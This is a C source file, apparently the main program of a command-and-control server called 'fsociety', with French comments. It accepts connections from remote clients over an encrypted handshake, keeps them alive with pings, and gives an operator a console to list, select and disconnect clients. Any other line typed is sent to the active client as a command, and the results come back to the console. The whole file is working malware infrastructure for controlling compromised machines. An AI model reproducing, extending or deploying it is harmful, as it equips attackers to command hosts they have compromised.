#include "server.h"
#include "handshake.h"
#include "protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <sys/select.h>
#include <time.h>

/* ============================================================
 * fsociety — Point d'entrée du C2
 * ============================================================ */

static volatile sig_atomic_t g_running = 1;
static uint16_t g_seq = 0;
static int      g_active_client = -1;   /* -1 = aucun */

static void handle_sigint(int sig)
{
    (void)sig;
    g_running = 0;
}

static void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("\n");
    printf("Options:\n");
    printf("  --port <num>    Port d'écoute (défaut: %u)\n",
           FSO_DEFAULT_PORT);
    printf("  --help          Affiche cette aide\n");
}

static void print_help(void)
{
    printf("\n--- Commandes locales ---\n");
    printf("  /list           Liste les clients connectés\n");
    printf("  /use <N>        Sélectionne le client N\n");
    printf("  /kill <N>       Déconnecte le client N\n");
    printf("  /help           Affiche cette aide\n");
    printf("  /quit           Quitte le C2\n");
    printf("  <autre>         Envoie la commande au client actif\n");
    printf("-------------------------\n\n");
}

/* ============================================================
 * Keepalive
 * ============================================================ */

static void check_keepalive(fso_server_t *srv, time_t now)
{
    for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
        fso_client_t *c = &srv->clients[i];
        if (!c->active || !c->has_key) continue;

        /* Client mort ? */
        if (c->last_pong > 0 &&
            (now - c->last_pong) >= FSO_TIMEOUT_SEC) {
            fprintf(stderr,
                    "[-] Client #%d timeout (pas de pong depuis %lds)\n",
                    i, (long)(now - c->last_pong));
            fso_server_disconnect(srv, i);
            if (g_active_client == i) g_active_client = -1;
            continue;
        }

        /* Envoyer un ping si nécessaire. */
        if (c->last_ping == 0 ||
            (now - c->last_ping) >= FSO_KEEPALIVE_SEC) {
            uint8_t ping_byte = 0x00;
            if (fso_server_send_secure(srv, i, MSG_PING, g_seq++,
                                       &ping_byte, 1) == 0) {
                c->last_ping = now;
            } else {
                fprintf(stderr, "[-] Envoi ping échoué, déconnexion #%d\n", i);
                fso_server_disconnect(srv, i);
                if (g_active_client == i) g_active_client = -1;
            }
        }
    }
}

/* ============================================================
 * Commandes locales
 * ============================================================ */

static void cmd_list(fso_server_t *srv)
{
    int count = 0;
    for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
        if (srv->clients[i].active && srv->clients[i].has_key) {
            printf("  #%d  %s:%u%s\n", i,
                   fso_server_client_ip(srv, i),
                   srv->clients[i].port,
                   (i == g_active_client) ? "  [ACTIF]" : "");
            count++;
        }
    }
    if (count == 0) {
        printf("  Aucun client connecté.\n");
    }
}

static int cmd_use(fso_server_t *srv, const char *arg)
{
    int n = atoi(arg);
    if (n < 0 || n >= FSO_MAX_CLIENTS) {
        printf("[-] Index invalide\n");
        return -1;
    }
    if (!srv->clients[n].active || !srv->clients[n].has_key) {
        printf("[-] Client #%d n'est pas connecté\n", n);
        return -1;
    }
    g_active_client = n;
    printf("[+] Client actif : #%d (%s)\n", n, fso_server_client_ip(srv, n));
    return 0;
}

static void cmd_kill(fso_server_t *srv, const char *arg)
{
    int n = atoi(arg);
    if (n < 0 || n >= FSO_MAX_CLIENTS) {
        printf("[-] Index invalide\n");
        return;
    }
    if (!srv->clients[n].active) {
        printf("[-] Client #%d n'est pas connecté\n", n);
        return;
    }
    fso_server_disconnect(srv, n);
    if (g_active_client == n) g_active_client = -1;
}

/* Traite une ligne tapée par l'utilisateur. Retourne :
 *   1  = continuer
 *   0  = quitter */
static int handle_stdin_line(fso_server_t *srv, char *line)
{
    /* Strip newline. */
    size_t len = strlen(line);
    while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) {
        line[--len] = '\0';
    }
    if (len == 0) return 1;

    /* Commandes locales ? */
    if (line[0] == '/') {
        if (strcmp(line, "/quit") == 0 || strcmp(line, "/exit") == 0) {
            return 0;
        }
        if (strcmp(line, "/help") == 0) {
            print_help();
            return 1;
        }
        if (strcmp(line, "/list") == 0) {
            cmd_list(srv);
            return 1;
        }
        if (strncmp(line, "/use ", 5) == 0) {
            cmd_use(srv, line + 5);
            return 1;
        }
        if (strncmp(line, "/kill ", 6) == 0) {
            cmd_kill(srv, line + 6);
            return 1;
        }
        printf("[-] Commande inconnue : %s\n", line);
        print_help();
        return 1;
    }

    /* Sinon : envoyer au client actif. */
    if (g_active_client < 0 ||
        !srv->clients[g_active_client].active ||
        !srv->clients[g_active_client].has_key) {
        printf("[-] Aucun client actif. Utilisez /list puis /use N\n");
        return 1;
    }

    printf("[>] Envoi de %zu octets au client #%d\n", len, g_active_client);
    if (fso_server_send_secure(srv, g_active_client, MSG_CMD, g_seq++,
                               (const uint8_t *)line,
                               (uint32_t)len) < 0) {
        fprintf(stderr, "[-] Envoi échoué\n");
    }
    return 1;
}

/* ============================================================
 * Boucle principale
 * ============================================================ */

static int run_server(fso_server_t *srv)
{
    printf("[+] C2 démarré. Tapez /help pour l'aide.\n\n");
    printf("c2> ");
    fflush(stdout);

    while (g_running) {
        fd_set readfds;
        FD_ZERO(&readfds);

        FD_SET(srv->listen_fd, &readfds);
        FD_SET(STDIN_FILENO, &readfds);
        int maxfd = srv->listen_fd;
        if (STDIN_FILENO > maxfd) maxfd = STDIN_FILENO;

        for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
            if (srv->clients[i].active) {
                FD_SET(srv->clients[i].fd, &readfds);
                if (srv->clients[i].fd > maxfd) {
                    maxfd = srv->clients[i].fd;
                }
            }
        }

        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            perror("[server] select");
            return -1;
        }

        time_t now = time(NULL);
        check_keepalive(srv, now);

        if (ret == 0) continue;

        /* ---------- STDIN ---------- */
        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            char line[1024];
            if (fgets(line, sizeof(line), stdin) == NULL) {
                /* EOF : Ctrl+D */
                printf("\n[+] EOF sur stdin, arrêt.\n");
                break;
            }
            if (handle_stdin_line(srv, line) == 0) {
                break;
            }
            printf("c2> ");
            fflush(stdout);
        }

        /* ---------- Nouvelle connexion ---------- */
        if (FD_ISSET(srv->listen_fd, &readfds)) {
            int idx = fso_server_accept(srv);
            if (idx >= 0) {
                uint8_t aes_key[FSO_KEY_SIZE];
                if (fso_handshake(srv, idx, aes_key) != 0) {
                    fprintf(stderr, "[-] Handshake échoué pour client #%d\n", idx);
                    fso_server_disconnect(srv, idx);
                } else {
                    printf("\n[+] Client #%d : session chiffrée établie\n", idx);

                    memcpy(srv->clients[idx].aes_key, aes_key, FSO_KEY_SIZE);
                    srv->clients[idx].has_key = 1;
                    srv->clients[idx].last_ping = now;
                    srv->clients[idx].last_pong = now;

                    /* Premier client : devient actif automatiquement. */
                    if (g_active_client < 0) {
                        g_active_client = idx;
                        printf("[+] Client #%d devient le client actif\n", idx);
                    }

                    printf("c2> ");
                    fflush(stdout);
                }
            }
        }

        /* ---------- Données entrantes d'un client ---------- */
        for (int i = 0; i < FSO_MAX_CLIENTS; i++) {
            if (!srv->clients[i].active) continue;
            if (!srv->clients[i].has_key) continue;
            if (!FD_ISSET(srv->clients[i].fd, &readfds)) continue;

            fso_header_t header;
            uint8_t payload[FSO_MAX_PAYLOAD];

            int n = fso_server_recv_secure(srv, i, &header,
                                           payload, sizeof(payload));
            if (n < 0) {
                fso_server_disconnect(srv, i);
                if (g_active_client == i) g_active_client = -1;
                continue;
            }

            switch (header.type) {

            case MSG_PONG:
                srv->clients[i].last_pong = now;
                break;

            case MSG_RESULT:
                printf("\n[client #%d] résultat (%d octets) :\n", i, n);
                if (n > 0) {
                    fwrite(payload, 1, (size_t)n, stdout);
                    if (payload[n-1] != '\n') printf("\n");
                }
                printf("c2> ");
                fflush(stdout);
                break;

            default:
                printf("\n[client #%d] type=0x%02X, %d octets\n",
                       i, header.type, n);
                if (n > 0) {
                    fwrite(payload, 1, (size_t)n, stdout);
                    printf("\n");
                }
                printf("c2> ");
                fflush(stdout);
                break;
            }
        }
    }

    return 0;
}

int main(int argc, char **argv)
{
    uint16_t port = FSO_DEFAULT_PORT;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        }
        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            long p = strtol(argv[i + 1], NULL, 10);
            if (p <= 0 || p > 65535) {
                fprintf(stderr, "[-] Port invalide : %s\n", argv[i + 1]);
                return 1;
            }
            port = (uint16_t)p;
            i++;
        } else {
            fprintf(stderr, "[-] Option inconnue : %s\n", argv[i]);
            print_usage(argv[0]);
            return 1;
        }
    }

    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);

    fso_server_t srv;
    if (fso_server_init(&srv, port) != 0) {
        fprintf(stderr, "[-] Échec init serveur\n");
        return 1;
    }

    int ret = run_server(&srv);

    fso_server_close(&srv);
    return ret == 0 ? 0 : 1;
}